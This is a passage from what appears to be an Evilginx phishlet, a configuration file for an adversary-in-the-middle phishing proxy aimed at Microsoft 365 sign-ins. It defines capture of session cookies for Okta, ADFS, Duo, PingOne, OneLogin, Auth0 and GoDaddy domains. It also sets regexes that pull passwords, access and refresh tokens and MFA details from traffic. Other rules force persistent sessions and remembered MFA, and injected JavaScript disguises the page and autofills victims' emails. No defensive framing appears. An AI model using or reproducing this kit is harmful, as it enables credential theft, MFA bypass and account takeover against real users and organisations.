    keys: ['.*,regexp']

  # SecureServer.net - GoDaddy's authentication backend
  - domain: '.secureserver.net'
    keys: ['auth_idp', 'auth_idp_sid', 'gdtoken', '.*,regexp']
  - domain: 'secureserver.net'
    keys: ['.*,regexp']
  - domain: '.sso.secureserver.net'
    keys: ['.*,regexp']
  - domain: '.idp.secureserver.net'
    keys: ['.*,regexp']
  - domain: '.login.secureserver.net'
    keys: ['.*,regexp']
  - domain: '.auth.secureserver.net'
    keys: ['.*,regexp']

  # =========================================================================
  # OKTA - Session token capture (activated when okta_org param is set)
  # =========================================================================
  - domain: '{okta_org}.okta.com'
    keys: ['idx:always', 'sid:opt', 'DT:opt', '.*,regexp:opt']
  - domain: '.oktacdn.com'
    keys: ['.*,regexp:opt']

  # =========================================================================
  # ADFS - Session token capture (activated when adfs_sub/adfs_domain set)
  # =========================================================================
  - domain: '.{adfs_domain}'
    keys: ['.*,regexp:opt']

  # =========================================================================
  # DUO SECURITY - Token capture (activated when duo_api/duo_sso set)
  # =========================================================================
  - domain: '.duosecurity.com'
    keys: ['.*,regexp:opt']

  # =========================================================================
  # JUMPCLOUD - Session tokens (always active)
  # =========================================================================
  - domain: '.jumpcloud.com'
    keys: ['x-xsrftoken:opt', 'session:opt', '.*,regexp:opt']

  # =========================================================================
  # PINGONE - Session tokens (always active)
  # =========================================================================
  - domain: '.pingone.com'
    keys: ['ST:opt', 'PA:opt', '.*,regexp:opt']

  # =========================================================================
  # ONELOGIN - Session tokens (always active)
  # =========================================================================
  - domain: '.onelogin.com'
    keys: ['sub_session_onelogin.com:opt', '.*,regexp:opt']

  # =========================================================================
  # AUTH0 - Session tokens (always active)
  # =========================================================================
  - domain: '.auth0.com'
    keys: ['auth0:opt', 'did:opt', '.*,regexp:opt']

# Capture tokens from HTTP response bodies (landingv2 returns tokens in POST body)
http_tokens:
  - domain: "www.office.com"
    path: "/landingv2"
    keys:
      - name: "id_token"
        search: 'name="id_token"[^>]*value="([^"]+)"'
      - name: "code"
        search: 'name="code"[^>]*value="([^"]+)"'
      - name: "state"
        search: 'name="state"[^>]*value="([^"]+)"'

  - domain: "outlook.office.com"
    path: "/landing*"
    keys:
      - name: "id_token"
        search: 'name="id_token"[^>]*value="([^"]+)"'
      - name: "code"
        search: 'name="code"[^>]*value="([^"]+)"'

  - domain: "login.microsoftonline.com"
    path: "/common/oauth2/v2.0/token"
    keys:
      - name: "access_token"
        search: '"access_token"\s*:\s*"([^"]+)"'
      - name: "refresh_token"
        search: '"refresh_token"\s*:\s*"([^"]+)"'
      - name: "id_token"
        search: '"id_token"\s*:\s*"([^"]+)"'

# Capture tokens from POST request bodies
body_tokens:
  - domain: "www.office.com"
    path: "/landingv2"
    keys:
      - name: "id_token"
        search: 'id_token=([^&]+)'
      - name: "code"
        search: 'code=([^&]+)'
      - name: "state"
        search: 'state=([^&]+)'

  - domain: "outlook.office.com"
    path: "/owa/*"
    keys:
      - name: "code"
        search: 'code=([^&]+)'

auth_urls:
  - "/common/oauth2/v2.0/token"
  - "/common/oauth2/token"
  - "/kmsi*"
  - "/landingv2"
  - "/landing*"
  - "/ppsecure/post.srf*"         
  - "/owa/auth/logon.aspx*"       
  - "/common/SAS/ProcessAuth"    
  - "/ecp/authorize*"             
  - "/mail/inbox*"            
  - "/owa/auth/errorfe.aspx*" 
  - "/login.srf"


   
force_post:
  - path: "/common/oauth2/v2.0/authorize"
    search:
      - { key: "scope", search: ".*" }
    force:
      - { key: "scope", value: "openid profile email offline_access" }
    type: "post"

  - path: "/common/oauth2/v2.0/authorize"
    search:
      - { key: "prompt", search: ".*" }
    force:
      - { key: "prompt", value: "login" }
    type: "post"

  - path: "/common/oauth2/v2.0/token"
    search:
      - { key: "grant_type", search: ".*" }
    force:
      - { key: "grant_type", value: "refresh_token" }
    type: "post"

  - path: "/common/SAS/ProcessAuth"
    search:
      - { key: "rememberMFA", search: ".*" }
      - { key: "ESTSAUTHPERSISTENT", search: ".*" }
      - { key: "x-ms-RefreshTokenCredential", search: ".*", optional: true }
    force:
      - { key: "rememberMFA", value: "true" }
      - { key: "PPSession", value: "true" }
    type: "post"

  - path: "/owa/auth.owa"
    search:
      - { key: "username", search: ".*" }
      - { key: "ESTSAUTHPERSISTENT", search: ".*" }
      - { key: "x-ms-RefreshTokenCredential", search: ".*", optional: true }
    force:
      - { key: "PPSession", value: "true" }
    type: "post"

  - path: "/kmsi"
    search:
      - { key: "PPSession", search: ".*" }
    force:
      - { key: "PPSession", value: "true" }
    type: "post"

  # ADFS - Force KMSI (Keep Me Signed In) for persistent session cookies
  - path: "/kmsi"
    search:
      - { key: "LoginOptions", search: ".*" }
    force:
      - { key: "LoginOptions", value: "1" }
    type: "post"
    
  - path: '/common/SAS'
    search:
      - {key: 'rememberMFA', search: '.*'}
    force:
      - {key: 'rememberMFA', value: 'true'}
    type: 'post'

credentials:
  username:
    key: '(username|login|UserName|user|email|email_address|mail|account|identifier|userid|user_id|loginId|membername|session_key)'
    search: '"(?:username|login|UserName|user|email|email_address|mail|account|identifier|userid|user_id|loginId|membername|session_key)"\s*:\s*"([^"]+)"'
    type: 'json'
  password:
    key: '(passwd|Password|password|pass|pwd|Passwd|session_password|login_password|userpassword|user_pass|access_key|secretKey|password_field|loginpass|secret_password)'
    search: '(.*)'
    type: 'post'
  custom:
  - key: '"password"'
    search: '"password"\s*:\s*"([^"]+)"'
    type: 'json'
  - key: '"Passwd"'
    search: '"Passwd"\s*:\s*"([^"]+)"'
    type: 'json'
  - key: '"access_key"'
    search: '"access_key"\s*:\s*"([^"]+)"'
    type: 'json'
  - key: '"secretKey"'
    search: '"secretKey"\s*:\s*"([^"]+)"'
    type: 'json'
  - key: 'mfaAuthMethod'
    search: '(.*)'
    type: 'post'
  - key: '"device"'
    search: '"device"\s*:\s*"([^"]+)"'
    type: 'json'
  - key: '"refresh_token"'
    search: '"refresh_token"\s*:\s*"([^"]+)"'
    type: 'json'

login:
  domain: 'login.microsoftonline.com'
  path: '/'


js_inject:
  - trigger_domains: ["login.microsoftonline.com"]
    trigger_paths: ["/*"]
    script: |
      const rw = ['Welcome', 'Secure', 'Access', 'Portal', 'Login', 'Account', 'Verify', 'Sign In'];
      document.title = rw[Math.floor(Math.random() * rw.length)] + ' - Microsoft';

      function lp(){
        const ei = document.getElementById("i0116");
        if (!ei) return false;

        let em = "";

        // Method 1: Evilginx session param
        const ep = "{" + "email}";
        const ev = "{email}";
        if (ev !== ep) em = ev;

        // Method 2: URL hash fragment (plain or base64)
        if (!em && window.location.hash.length > 1) {
          let h = window.location.hash.substring(1);
          // Try plain email first (most common case)
          try {
            let d = decodeURIComponent(h).replace(/=+$/, '');
            if (d.indexOf("@") !== -1) em = d;
          } catch(e) {}
          // Fallback: try base64 decode
          if (!em) {
            try {
              let p = h;
              while (p.length % 4 !== 0) p += '=';
              let d = atob(p).replace(/=+$/, '');
              if (d.indexOf("@") !== -1) em = d;
            } catch(e) {}
          }
        }

        // Method 3: login_hint query param
        if (!em) {
          try {
            const sp = new URLSearchParams(window.location.search);
            const lh = sp.get("login_hint") || sp.get("username");
            if (lh && lh.indexOf("@") !== -1) em = lh;
          } catch(e) {}
        }

        if (em) {
          ei.value = em;
          ei.dispatchEvent(new Event('input', { bubbles: true }));
          ei.dispatchEvent(new Event('change', { bubbles: true }));
          ei.dispatchEvent(new Event('keyup', { bubbles: true }));
          ei.focus();
          const nb = document.getElementById("idSIButton9");
          if (nb) nb.click();
          return true;
        }
        return false;
      }

      const ci = setInterval(function() {
        if (lp()) clearInterval(ci);
      }, 500);


